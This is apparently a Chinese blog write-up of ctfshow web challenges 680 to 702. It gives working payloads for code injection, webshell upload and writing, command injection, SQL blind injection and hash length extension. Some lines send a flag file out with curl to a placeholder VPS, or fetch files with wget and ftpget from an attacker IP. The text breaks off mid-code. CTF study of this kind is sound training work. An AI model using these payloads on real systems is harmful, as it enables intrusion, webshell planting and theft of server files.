---
title: ctfshow-大赛原题（未完）
id: ctfshow-大赛原题（未完）
---

<!-- more -->

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1909955412&auto=0&height=66"></iframe>

```
# 上面播放器的代码如下（仅网易云外链链接，其他播放器请自行百度）
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1909955412&auto=0&height=66"></iframe>
# width(宽度) ; height(高度)
# type = 歌曲(1) | 歌单(2) | 电台(3)
# id = 歌曲ID号
# auto = 自动播放(1) | 手动播放(0)
```



## 680-国赛某题

```
post code to run!
```

那么post传一个code试试：

```
code=phpinfo();
```

```
disable_functions ban掉了这些：
assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstoped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,fopen,file_get_contents,fread,file,readfile,opendir,readdir,closedir,rewinddir
```

想到scandir一下当前目录：

```
code=var_dump(scandir('.'));
```

得到

```php
array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "index.php" [3]=> string(21) "secret_you_never_know" }
```

访问secret_you_never_know，下载打开即可



## 681-\\'

bp抓包

![](https://s2.loli.net/2022/01/05/WnFolyzp2UcaD3G.png)

```
select count(*) from ctfshow_users where username = '' or nickname = ''
```

fuzz一下，过滤了空格，有长度限制11，

> 原题的话是单引号`'`被转换为`\`，那么构造最后一个字符为单引号，那就能将右边的单引号转义了，那么：
>
> ```
> name=or(1)%231%27
> ```
>
> 此时这个 session 就已经被标记为登陆成功 , 而且应该是管理员
> 那么我们将这个 session 设置到浏览器刷新试试

而本题则是将单引号置换为空~，传入单引号肯定不行了，但思路是一样的，利用\转义单引号并使得查询结果为真

直接传一个：`\`

```
name=or(1)#1\
```

![](https://s2.loli.net/2022/01/05/CVXvnk8ptqgHEW7.png)

![](https://s2.loli.net/2022/01/05/OAhpRCij1wXgmEB.png)



## (x)682-前端js调试

很头疼的前端js逆向=-=

[HCTF2017 部分 Web 出题思路详解 (seebug.org)](https://paper.seebug.org/452/)



## 683-(int)'6e6'=6 

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-09-24 17:34:28
# @Last Modified by:   h1xa
# @Last Modified time: 2021-09-24 20:32:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

   error_reporting(0);
   include "flag.php";
   if(isset($_GET['秀'])){
       if(!is_numeric($_GET['秀'])){
          die('必须是数字');
       }else if($_GET['秀'] < 60 * 60 * 24 * 30 * 2){
          die('你太短了');
       }else if($_GET['秀'] > 60 * 60 * 24 * 30 * 3){
           die('你太长了');
       }else{
           sleep((int)$_GET['秀']);
           echo $flag;
       }
       echo '<hr>';
   }
   highlight_file(__FILE__);
```

> 参考：[一个CTF GAME引发的php内核分析 (seebug.org)](https://paper.seebug.org/566/)
>
> 使用int强制转换一个科学计数法表示的字符串，转换过程中并不能识别科学计数法，只是把e当做普通字符了
>
> 在php7.0以前的版本中(int)’6e6’结果是6，但是在7.1以后的版本中，(int)’6e6’已经是6000000，符合(int)’6e6’ = (int)(float)’6e6’这个逻辑了。

```
?秀=6e6
```

## 684-create_function代码注入

```php
<?php
$action = $_GET['action'] ?? '';
$arg = $_GET['arg'] ?? '';

if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
    show_source(__FILE__);
} else {
    $action('', $arg);
}
```

> ?? —— Null合并运算符
>
> PHP 7添加了新的运算符 双问号（??）运算符
>
> - 如果它存在且不为NULL，则返回其第一个操作数；否则返回第二个操作数
> - 从左到右评估
> - Null合并运算符也可以链形式使用
>
> ```php
> <?php
> var_dump($a ?? 1 ?? 2);		# int(1)
> var_dump($a ?? $b ?? 2);	# int(2)
> ```
>
> 未定义$a，$b，则：
> `$a ?? 1 => 1   1 ?? 2 => 1`
> `$a ?? $b => $a  $a ?? 2 => 2`

有点像之前刷到的create_function代码注入

正则匹配要求找到一个不影响函数正常使用的字符，这里用的是命名空间`\`

虽然这里提示create_function()被弃用了：`create_function() is deprecated`

但并不影响我们代码注入~

```
?action=\create_function&arg=echo 1;}eval($_POST[1]);
```

## 685-pcrewaf

```php
<?php
function is_php($data){
    return preg_match('/<\?.*[(`;?>].*/is', $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = './data/';
$data = file_get_contents($_FILES['file']['tmp_name']);
if (is_php($data)) {
    echo "bad request";
} else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . '/' . random_int(0, 10) . '.php';
    move_uploaded_file($_FILES['file']['tmp_name'], $path);

    header("Location: $path", true, 303);
}
```

对上传的文件内容进行检测，符合正则即含有php代码则输出`错误的请求`，不符合则将其保存到`/data/随机数.php`；并在请求头返回路径：`header("Location: $path", true, 303);`



看正则：

```
/<\?.*[(`;?>].*/is

找的是<?开头，[(`;?>]结尾的字符串
```

一般想到用其他的 php tags：
`<?php`、`<%=`、`<%, %>`、`<script language="php">`、`<?=`
但在php7里这些都被移除了

![](https://s2.loli.net/2022/01/09/qNPUkRDGpyTA5fL.png)



> [PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)
> 所以，我们题目中的正则
>
> ```
> <\?.*[(`;?>].*
> ```
>
> 假设匹配的输入是`<?php phpinfo();//aaaaa`，实际执行流程是这样的：
>
> ![](https://www.leavesongs.com/media/attachment/2018/11/26/51bfc7bb-fd9a-402e-971a-a2247b226f3d.3adc35af4c1d.png)
>
> 见上图，可见第4步的时候，因为第一个`.*`可以匹配任何字符，所以最终匹配到了输入串的结尾，也就是`//aaaaa`。但此时显然是不对的，因为正则显示`.*`后面还应该有一个字符`[(`;?>]`。
>
> 所以NFA就开始回溯，先吐出一个`a`，输入变成第5步显示的`//aaaa`，但仍然匹配不上正则，继续吐出`a`，变成`//aaa`，仍然匹配不上……
>
> 最终直到吐出`;`，输入变成第12步显示的`<?php phpinfo()`，此时，`.*`匹配的是`php phpinfo()`，而后面的`;`则匹配上
>
> ```
> [(`;?>]
> ```
>
> 这个结果满足正则表达式的要求，于是不再回溯。13步开始向后匹配`;`，14步匹配`.*`，第二个`.*`匹配到了字符串末尾，最后结束匹配。

这里考虑到利用PHP的`pcre.backtrack_limit`限制,其默认回溯上限为100万，所以可以构造一个超长的字符串使得正则匹配失败从而绕过



```php
import requests
from io import BytesIO

f = {
    'file':BytesIO(b'<?php eval($_POST[1]);//'+b'aaaa'*250000)
}
url = "http://241e07f7-835c-4d7d-b016-e1563af9d477.challenge.ctf.show/"
r = requests.post(url,files=f,allow_redirects=False)
print(r.headers)
```

![](https://s2.loli.net/2022/01/09/cb1KZlOno2EDysz.png)

从请求头获得了路径，访问rce即可



## 686-无参数rce

```php
<?php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
} else {
    show_source(__FILE__);
}
```

看正则，传入的get只能是函数形式：`a();`；(?R)?表示递归查询，也就是像`a(a());`这样

那么思路就是利用php的函数来执行咱们想要的东西



因为这题没啥过滤，一个思路是扫描目录然后读文件：
考虑用`scandir()`，然后需要的`.`可以利用`localeconv()`构造：[PHP： localeconv - Manual](https://www.php.net/manual/zh/function.localeconv.php)



> ```php
> localeconv()	——返回一包含本地数字及货币格式信息的数组,数组第一项是.
> current()		——别名为pos()返回数组中的当前元素值, 默认取第一个值，
> array_reverse()	——逆向输出数组
> array_flip()	——交换数组的键和值
> array_rand()	——从数组随机一个或多个单元，不断刷新访问就会不断随机返回
> ```
>
> ![](https://s2.loli.net/2022/01/09/wct2JBFUDs8iN9V.png)

不过这里输出了一下当前和上级目录发现都不在，那应该就是在根目录下了

```
var_dump(scandir(pos(localeconv())));
var_dump(scandir(next(scandir(pos(localeconv())))));
```

那就尝试另外的方法：



一是在headers里写马：

```
eval(pos(getallheaders())); # 利用xff传参
eval(array_rand(array_flip(getallheaders()))); # 利用了rand，比较随机，哪个请求标头都行，多跑几次
```

![](https://s2.loli.net/2022/01/09/1ClUiVH58Tzh6Qm.png)



另一个就是利用`get_defined_vars()`

思路是将`GET POST COOKIE FILE`方法传输的数据截取出来，再利用eval包起来从而实现rce

像这次长安战疫，把其他方法都ban掉了

```php
<?php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) { 
    if(!preg_match('/session|end|next|header|dir/i',$_GET['code'])){
        eval($_GET['code']);
    }else{
        die("Hacker!");
    }
}else{
    show_source(__FILE__);
}

?>
```

payload：

将数组的键名和键值对调，然后把他单独获取出来再eval
这里要把执行的参数第一个传~

```
?a=system('ls');&code=eval(array_rand(array_flip(current(get_defined_vars()))));

?a=system('tac flag.php');&code=eval(array_rand(array_flip(current(get_defined_vars()))));
```

## 687-ping拼接

```php
<?php
    highlight_file(__FILE__);
    $target = $_REQUEST[ 'ip' ];
    $target=trim($target);
    $substitutions = array(
        '&'  => '',
        ';' => '',
        '|' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    $cmd = shell_exec( 'ping  -c 1 ' . $target );
    echo  "<pre>{$cmd}</pre>";
```

过滤了很多，简单来说就是利用拼接符执行多条命令

不过这里大部分都被ban了，用换行即可

```
?ip=127.0.0.1%0als /
    
?ip=127.0.0.1%0atac /flaaag
```

## 688-escapeshellarg()和escapeshellcmd() 之殇

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

//flag in /flag
$url = $_GET['url'];
$urlInfo = parse_url($url);
if(!("http" === strtolower($urlInfo["scheme"]) || "https"===strtolower($urlInfo["scheme"]))){
    die( "scheme error!");
 }
$url=escapeshellarg($url);
$url=escapeshellcmd($url);
system("curl ".$url);
```

escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数

escapeshellcmd — shell 元字符转义

```
首先要明确会被\转义的符号：
\、?、<、>、(、)、[、]、;、不配对的'、''
```

[PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org)](https://paper.seebug.org/164/)

![](https://i.loli.net/2021/07/16/ejALvfW6SUzXb9s.png)



```php
$url = $_GET['url'];
$urlInfo = parse_url($url);
if(!("http" === strtolower($urlInfo["scheme"]) || "https"===strtolower($urlInfo["scheme"]))){
    die( "scheme error!");
 }
```

> parse_url — 解析 URL，返回其组成部分
>
> - scheme - 如 http
> - host
> - port
> - user
> - pass
> - path
> - query - 在问号 `?` 之后
> - fragment - 在散列符号 `#` 之后
>
> if语句对scheme部分进行判断，要求是http或者https



提示了flag在/flag，利用curl的-F参数传到vps上

```
http://xxx.xxx.xxx.xxx:12121/%27%20-v%20-F%20%27file=@/flag
```

![](https://s2.loli.net/2022/01/18/xHc9yYfrdaVBqmz.png)

## 689-sycsec

```php
<?php 
error_reporting(0);
if(isset($_GET) && !empty($_GET)){
    $url = $_GET['file'];
    $path = "upload/".$_GET['path'];
    
}else{
    show_source(__FILE__);
    exit();
}

if(strpos($path,'..') > -1){
    die('This is a waf!');
}


if(strpos($url,'http://127.0.0.1/') === 0){
    file_put_contents($path, file_get_contents($url));
    echo "console.log($path update successed!)";
}else{
    echo "Hello.CTFshow";
}
```

https://blog.csdn.net/vspiders/article/details/78170915

`file_put_contents($path, file_get_contents($url));`

传入

```
?file=http://127.0.0.1/&path=<?php eval($_POST[1]); ?>
```

可以看到页面回显如下：
![](https://s2.loli.net/2022/01/10/hPO98FyCZidr2xb.png)

那么就可以利用ssrf，将该页面写入到path中，从而实现写shell

记得url编码，然后访问1.php rce即可

```
?file=http%3A%2F%2F127.0.0.1%2F%3Ffile%3Dhttp%3A%2F%2F127.0.0.1%2F%26path%3D%3C%3Fphp%20eval(%24_POST%5B1%5D)%3B%20%3F%3E&path=1.php
```

## (x)690-HITCON CTF 2015-babyfirst

```php
<?php 
highlight_file(__FILE__);
error_reporting(0);
$args = $_GET['args'];
for ( $i=0; $i<count($args); $i++ ){
    if ( !preg_match('/^\w+$/', $args[$i]) )
        exit("sorry");
}

exec('./ ' . implode(" ", $args));
```

args要求传入为数组，count()计算数组单元数目，然后遍历数组检测是否为`[0-9a-zA-Z_]`

最后利用impload将数组元素拼接为以空格隔开的字符串，再exec



原题是这样：

[ctf/2015-10-18-hitcon/web_100_babyfirst at master · p4-team/ctf (github.com)](https://github.com/p4-team/ctf/tree/master/2015-10-18-hitcon/web_100_babyfirst)
[HITCON CTF 2015 Quals Web出题心得 - 网站安全 - 红黑联盟 (2cto.com)](https://www.2cto.com/Article/201510/446796.html)

[Babyfirst的分析和解答 | Spoock](https://blog.spoock.com/2017/09/09/Babyfirst-writeup/)

```php
<?php
    highlight_file(__FILE__);
    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);
    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }
    exec("/bin/orange " . implode(" ", $args));
?>
```

1. wget支持长号码格式解析IP主机：
   [在线ip转int,ip转数字-BeJSON.com](https://www.bejson.com/convert/ip2int/)
2. 寻找无需破折号的命令，利用tar将一个非压缩存档传递给php解释器
3. 在`/^\w+$\`中的`$`当遇到一个字符串的结尾是换行符时还是可以匹配的。利用这个特性，就可以绕过前面的`preg_match()`检查，同时多出的换行符还可以在`exec()`函数中执行正则可以利用%0a换行绕过来rce

```php
mkdir orange
cd orange
wget HEXED_IP
tar cvf payload orange
php payload
```

```
?args[]=x%0a
&args[]=mkdir
&args[]=exploit%0a

?args[]=x%0a
&args[]=cd
&args[]=exploit%0a
&args[]=wget
&args[]=1996740904%0a

?args[]=x%0a
&args[]=tar
&args[]=cvf
&args[]=archived
&args[]=exploit%0a

?args[]=x%0a
&args[]=php
&args[]=archived%0a
```

然后把这个往服务器上一放

```php
<?php
file_put_contents('a.php', '<?php exec($_POST[1]);?>');
?>
```

还有其他：

[Kali Linux（Debian）安装FTP服务器vsftpd教程_镜花水月-文文的博客-CSDN博客](https://blog.csdn.net/weixin_47830774/article/details/121865655)

```
busybox ftpget ...

busybox ftpget -u ftp的用户名 -p ftp的密码 ftp地址 需要下载的文件名
?args[]=xxx%0a&args[]=busybox&args[]=ftpget&args[]=%2du&args[]=uftp&args[]=%2dp&args[]=hhhadminaaa&args[]=1996740904&args[]=a.php

twistd telnet ...

wget HEX_IP
// 给个 302 Redirect 到 FTP protocol 上，也是这题解法中最讶异的XD
// 本来还检查过 wget source code 想说产生的 index.html 应该不可控，结果居然到 FTP Protocol 上竟然就可以控  
```





## 691-order by 盲注

```php
<?php
 
include('inc.php');
highlight_file(__FILE__);
error_reporting(0);
function   filter($str){
      $filterlist = "/\(|\)|username|password|where|
      case|when|like|regexp|into|limit|=|for|;/";
      if(preg_match($filterlist,strtolower($str))){
        die("illegal input!");
      }
      return $str;
  }
$username = isset($_POST['username'])?
filter($_POST['username']):die("please input username!");
$password = isset($_POST['password'])?
filter($_POST['password']):die("please input password!");
$sql = "select * from admin where  username =
 '$username' and password = '$password' ";

$res = $conn -> query($sql);
if($res->num_rows>0){
  $row = $res -> fetch_assoc();
  if($row['id']){
     echo $row['username'];
  }
}else{
   echo "The content in the password column is the flag!";
}

?>
```

[CTF中过滤括号的盲注题小记_大方子-CSDN博客sql注入括号被过滤](https://blog.csdn.net/nzjdsds/article/details/81879181)

利用order by 盲注，如下：

```
select * from admin where  username = 'admin' and password = '' union select 1,2,'0' order by 3 #
```

看源码可知有三个键名：id、username、password，

此处这里order by 3 就是将查询结果按password排序

当select 1,2,'0' 时，假设password值为admin，那么优先显示的username为2

当select 1,2,'b' 时，b小于a，则优先显示：admin

写个脚本盲注：（strs的顺序有讲究，这里我是按ascii表排的）

```python
import requests
import time

url = "http://ffeff89d-7853-41d5-b22c-d06910b73030.challenge.ctf.show/"
strs = "-0123456789abcdef}"

flag = "ctfshow{"
tmp = ""
while True:
    for i in strs:
        r = requests.post(url=url, data={"username": "1", "password": f"' or 1 union select 1,2,'{flag}{i}' from admin order by 3 #"})
        time.sleep(0.2)
        # print(r.text[5109:])
        if r.text[5109:] == "admin":
            flag += tmp
            print(flag)
            break
        if r.text[5109:] == '2' and i == 'f':
            flag += '}'
            print(flag)
            exit()
        tmp = i
```

## 692-经典的配置文件漏洞

```php
<?php

highlight_file(__FILE__);

if(!isset($_GET['option'])) die();
$str = addslashes($_GET['option']);
$file = file_get_contents('./config.php');
$file = preg_replace('|\$option=\'.*\';|', "\$option='$str';", $file);
file_put_contents('./config.php', $file);
```

[经典写配置漏洞与几种变形 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html)

[PHP正则经典漏洞 - dlive - 博客园 (cnblogs.com)](https://www.cnblogs.com/dliv3/p/6483830.html)

### 1.利用`$00`或`$0`

```
?option=;phpinfo();
?option=%00

然后访问/config.php
```

> 在[preg_replace](https://www.php.net/manual/zh/function.preg-replace.php)()的参数2中，`\0`和`$0`表示完整的模式匹配文本，即代表匹配到的全部内容

那么第一次将`;phpinfo();`写入了config.php

第二次传入`%00`，被addslashes()转为`\0`，那么就代表其匹配到的文本，即：`$option=';phpinfo();';`

```php
# 那么
preg_replace('|\$option=\'.*\';|', "\$option='\\0';", $file);
# 等同于
preg_replace('|\$option=\'.*\';|', "\$option='\$option=';phpinfo();';';", $file);
```

最终成功闭合单引号，将语句写入config.php：

```php
$option='\$option=';phpinfo();';';
```

### 2.利用换行符`%0a`和正则匹配缺陷

传入`?option=aaa';phpinfo();%0a//`

单引号`'`被addslashes()转义为`\'`

那么此时config.php内容为：

```php
<?php
$option='aaa\';phpinfo();
//';
```

正则表达式`\$option=\'.*\';`匹配到的内容为：`$option='aaa\';`，

将其替换为任意传入的字符串`?option=111`后重新写入config.php，从而成功闭合单引号：

```php
<?php
$option='111';phpinfo();
//';
```

### 3.利用反斜杠`\`转义单引号

```
?option=\';eval($_POST[1]);//
```

addslashes()将`\`转义为`\\`

但经preg_replace()处理后`\\`再次变为`\`
（即对单引号中的转义字符`\\`的处理）

```php
preg_replace('|\$option=\'.*\';|', "\$option='\\';", $file);
```

写入后：

```php
<?php
$option='\';
```

## 693-XCTF Final 2018

```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    ini_set('open_basedir', '/var/www/html');
    $file = 'function.php';
    $func = isset($_GET['function'])?$_GET['function']:'filters'; 
    call_user_func($func,$_GET);
    include($file);
    session_start();
    $_SESSION['name'] = $_POST['name'];
    if($_SESSION['name']=='admin'){
        header('location:admin.php');
    }
?>
```

`call_user_func($func,$_GET);`，可令$func=extract实现变量覆盖

从而实现对$file的控制，利用文件包含：`include($file);`

### 伪协议rce

那么直接利用伪协议rce：

```
?function=extract&file=data://text/plain,<?=system('cat /flag');?>
```

具体还是看链接吧[XCTF Final 2018 Web Writeup (Bestphp与PUBG详解) - 先知社区](https://xz.aliyun.com/t/3174)，学到很多：

但是因为open_basedir的原因，都不能成功=-=，还是rce了

### 文件包含session（x）

还是文件包含，只是包含的是session文件，

因为session的值可控：`$_SESSION['name'] = $_POST['name'];`

> session默认的保存位置
>
> ```
> /var/lib/php/sess_PHPSESSID
> /var/lib/php/sessions/sess_PHPSESSID
> 
> /var/lib/php5/sess_PHPSESSID
> /var/lib/php5/sessions/sess_PHPSESSID
> 
> /tmp/sess_PHPSESSID
> /tmp/sessions/sess_PHPSESSID
> ```
>
> 由于`ini_set('open_basedir', '/var/www/html:/tmp')`，我们包含不了`/var/lib/`下的session
>
> 但是我在tmp下也找不到自己的session，所以这里的session应该是在`/var/lib/`下
>
> 这里可以调用session_start函数，修改session的位置

不过这个方法在这里并不可行，因为本题`ini_set('open_basedir', '/var/www/html');`连/tmp也排除在外了~

### php7.0的bug（x）

> `string.strip_tags`可以导致php7在执行过程中奔溃
>
> 如果请求中同时存在一个文件上传的请求 , 这个文件就会被因为奔溃被保存在`/tmp/phpXXXXXX`(XXXXXX是数字+字母的6位数)
>
> 这个文件是持续保存的，不用竞争，直接爆破，为了爆破成功可以多线程去上传文件，生成多个phpXXXXXX

但是依然需要写到`/tmp`下，所以也g了

## 694

```php
<?php

error_reporting(0);

$action=$_GET['action'];
$file = substr($_GET['file'],0,3);
$ip = array_shift(explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']));

$content = $_POST['content'];

$path = __DIR__.DIRECTORY_SEPARATOR.$ip.DIRECTORY_SEPARATOR.$file;

if($action=='ctfshow'){
    file_put_contents($path,$content);
}else{
    highlight_file(__FILE__);
}

?>
```

> **array_shift()** — 将 `array` 的第一个单元移出并作为结果返回，将 `array` 的长度减一并将所有其它单元向前移动一位。所有的数字键名将改为从零开始计数，文字键名将不变。
>
> **explode** — 使用一个字符串分割另一个字符串

```php
# 文件名限制长度为3
$file = substr($_GET['file'],0,3);

# 即取xff传入的第一个ip
$ip = array_shift(explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']));

# 拼接路径为当前目录+目录分割符(/或\)+$ip+目录分割符(/或\)+$file
$path = __DIR__.DIRECTORY_SEPARATOR.$ip.DIRECTORY_SEPARATOR.$file;
```

对$file进行长度控制，但对$ip没有这个限制
$file可以选择传入`.`浏览器可以正常解析

然后用xff控制文件名即可

```
GET:
?file=.&action=ctfshow
POST:
content=<?php eval($_POST[1]);?>
headers:
X-Forwarded-For=b.php
```

![](https://s2.loli.net/2022/01/11/2Itz5ypsjSdJErL.png)

然后访问b.php即可

![](https://s2.loli.net/2022/01/11/S73IUVlyFWjCdmJ.png)



## 695-SCTF2020 CloudDisk

```
router.post('/uploadfile', async (ctx, next) => {
  const file = ctx.request.body.files.file;

  if (!fs.existsSync(file.path)) {
    return ctx.body = "Error";
  }

  if(file.path.toString().search("/dev/fd") != -1){
    file.path="/dev/null"
  }

  const reader = fs.createReadStream(file.path);
  let fileId = crypto.createHash('md5').update(file.name + Date.now() + SECRET).digest("hex");
  let filePath = path.join(__dirname, 'upload/') + fileId
  const upStream = fs.createWriteStream(filePath);
  reader.pipe(upStream)
  return ctx.body = "Upload success ~, your fileId is here：" + fileId;
  
});

router.get('/downloadfile/:fileId', async (ctx, next) => {
  let fileId = ctx.params.fileId;
  ctx.attachment(fileId);
  try {
    await send(ctx, fileId, { root: __dirname + '/upload' });
  }catch(e){
    return ctx.body = "no_such_file_~"
  }
});
```

[[SCTF2020\]CloudDisk - 灰信网（软件开发博客聚合） (freesion.com)](https://www.freesion.com/article/19171183596/)

> *Suppose you have JSON body parsing enabled on a POST or PUT route, say ‘/upload-files’, as well as multipart parsing. This is quite easy to do e.g. if you add JSON parsing as global middleware. Suppose it expects the files to be in a field named ‘uploads’. Then you can make a POST or PUT request to ‘/upload-files’ with a JSON body that looks something like {“files”: {“uploads”: [{“path”: “/any/file/path”}]}}, making the request handler think a file has been uploaded to /any/file/path. Now suppose that the handler is set up to copy uploaded files into a public uploads folder. By choosing the path appropriately I can make the server copy any file I like on the server into the public uploads folder and then view its contents. So by using well-known paths of sensitive files I can read private keys, passwords etc. and maybe even gain full access to the server this way.*

> g4师傅的解释：
>
> 关键在于`/uploadfile`和`/downloadfile/fileId`这两个地方，可以通过json将服务端文件伪造成上传的文件，通过获取到的fileid来下载，造成任意文件下载

```
/uploadfile
{"files": {"file":{"name":"aaa","path":"./flag"}}}

# 然后访问/downloadfile/fileId下载即可
url/downloadfile/ec14aa9469d7481af4ee3f80ab7395f0
```

![](https://s2.loli.net/2022/01/18/KYDcSNVAwLa69rH.png)





## (x)696-SCTF2020 Jsonhub

[SCTF2020/Web/Jsonhub/Write-up SycloverSecurity/SCTF2020 (github.com)](https://github.com/SycloverSecurity/SCTF2020/tree/b277cd036697fe051c1cd2f1112e89148167c37c/Web/Jsonhub/Write-up)

有点没整明白django，放一放，等开发一波=

## 697-2018安洵杯 无限手套

[2018 安洵杯-无限手套 - 梅不美 - 博客园 (cnblogs.com)](https://www.cnblogs.com/meibumei/p/13491339.html)

f12提示NOHO传参：Parameter NOHO:The Number Of Higher Organisms

1. 利用PHP中数组大小大于数字的特点：?NOHO[]=1

2. 输入123，根据回显猜测查询语句为：
   `SELECT master FROM secret WHERE password = binary 'md5(password)'`
   经典ffifdyop，md5后得到' or '从而将语句闭合：
   `SELECT master FROM secret WHERE password = binary ''or'6ɝ™顲,ù'`

   这里群主改了一下，要求密码为数字：`password must be a numeric`

   那么用：`129581926211651571912466741651878684928`



## 698-哈希长度扩展攻击



看了一下没发现啥东西，抓包看到

`Set-Cookie: hash_key=d5e1090511b80a55f206f1b0c03c8b5a; source=0;`

source改为1可以查看源码

```php
<?php
@error_reporting(0);

$flag = "flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxx}";
$secret_key = "xxxxxxxxxxxxxxxx"; // the key is safe! no one can know except me
$username = $_POST["username"];
$password = $_POST["password"];
header("hash_key:" . $hash_key);

if (!empty($_COOKIE["getflag"])) {
    if (urldecode($username) === "D0g3" && urldecode($password) != "D0g3") {
        if ($COOKIE["getflag"] === md5($secret_key . urldecode($username . $password))) {
            echo "Great! You're in!\n";
            die ("<!-- The flag is ". $flag . "-->");
        }
        else {
            die ("Go out! Hacker!");
        }
    }
    else {
        die ("LEAVE! You're not one of us!");
    }
}

setcookie("sample-hash", md5($secret_key . urldecode("D0g3" . "D0g3")), time() + (60 * 60 * 24 * 7));

if (empty($_COOKIE["source"])) {
    setcookie("source", 0, time() + (60 * 60 * 24 * 7));
}
else {
    echo "<source_code>";
    }
}
```

看到g4师傅在bss发了wp，知道本题的考点是哈希长度扩展攻击，

原题是2018安洵杯的hash[安洵杯2018 官方Writeup - D0g3 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/3445#toc-6)

浅尝一下吧：

[哈希长度拓展攻击(Hash Length Extension Attacks) - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2563)

[哈希长度扩展攻击的简介以及HashPump安装使用方法 - pcat - 博客园 (cnblogs.com)](https://www.cnblogs.com/pcat/p/5478509.html)

哈希值就是cookie里的那串`d5e1090511b80a55f206f1b0c03c8b5a`，密钥是`D0g3`但是长度没给，可以一位位试,附加信息填什么都可以

```python
import hashpumpy
import requests
import time

for i in range(10, 20):
    s = hashpumpy.hashpump('d5e1090511b80a55f206f1b0c03c8b5a', 'D0g3', '1', i)
    headers = {
            "Cookie": "hash_key=d5e1090511b80a55f206f1b0c03c8b5a; source=0; getflag="+s[0]
    }
    data = {
        "username": 'D0g3',
        "password": s[1]
    }
    r = requests.post('http://3416f5e4-b1a8-45a3-9da0-7ff96465cfa6.challenge.ctf.show/', headers=headers, data=data)
    if "ctfshow" in r.text:
        print(s)
        print(r.text)
        exit(0)
    time.sleep(0.5)
```



## (x)700-2019安洵杯css game

原题是2019安洵杯的css game：

[安洵杯2019 官方Writeup(Web/Misc) - D0g3 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6911#toc-12)

[安洵杯 2019 cssgame | 洛冰河 (glacierluo.com)](https://www.glacierluo.com/exercise/ctf/web/cssgame/)

提示flag.html的内容是像这样的格式

```html
    flag.html
    <!--
        <html>
            <link rel="stylesheet" href="${encodeURI(req.query.css)}" />
             <form>
                <input name="Email" type="text" value="test">
                <input name="flag" type="hidden" value="202cb962ac59075b964b07152d234b70"/>
                <input type="submit" value="提交">
            </form>
        </html>
    -->
```



## 701-nodejs

nodejs

```php
const express = require('express');
const path = require('path');
const vm = require('vm');

const app = express();

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', function (req, res, next) {
  let output = '';
  const code = req.query.code + '';
  if (code && code.length < 200 && !/[^a-z().]/.test(code)) {
    try {
      const result = vm.runInNewContext(code, {}, { timeout: 500 });
      if (result === 1337) {
        output = process.env.FLAG;
      } else {
        output = 'nope';
      }
    } catch (e) {
      output = 'nope';
    }
  } else {
    output = 'nope';
  }
  res.render('index', { title: '[a-z().]', output });
});

app.get('/source', function (req, res) {
  res.sendFile(path.join(__dirname, 'app.js'));
});

module.exports = app;
```

重点在

```php
  if (code && code.length < 200 && !/[^a-z().]/.test(code)) {
    try {
      const result = vm.runInNewContext(code, {}, { timeout: 500 });
      if (result === 1337) {
        output = process.env.FLAG;
      }
```

因为对nodejs不熟--，这里直接丢bit师傅的payload：

> 我们必须创建一个在上下文中运行时将返回1337的有效负载。
>
> 第一个解决方案是： 它有141个字符长。它使用1337的因式分解，即7*191
>
> ```
> escape.name.concat(eval.length).repeat(eval.name.concat(eval).repeat(eval.name.concat(eval.length).length).concat(escape.name).length).length
> ```
>
>
> 然后改进成: 它有118个字符长
>
> ```
> escape.name.concat(eval.length).repeat(escape(escape(escape(escape(escape(escape(escape(unescape))))))).length).length
> ```
>
> 或者: 
>
> ```
> console.profile.name.repeat(escape(escape(eval).sup().bold().link().link()).length).length
> ```
>
> 最佳payload不使用因子分解: 只有85个字符长
>
> ```
> escape(escape(eval).repeat(escape.name.sup().length)).concat(eval.name.link()).length
> ```



## 702-[HarekazeCTF2019] Avatar Uploader

原题似乎是  **[HarekazeCTF2019]Avatar Uploader**的1和2结合起来了~

www.zip源码泄露

```php
# upload.php
<?php
error_reporting(0);

require_once('config.php');
require_once('lib/util.php');
require_once('lib/session.php');

$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);

// check whether file is uploaded
if (!file_exists($_FILES['file']['tmp_name']) || !is_uploaded_file($_FILES['file']['tmp_name'])) {
  error('No file was uploaded.');
}

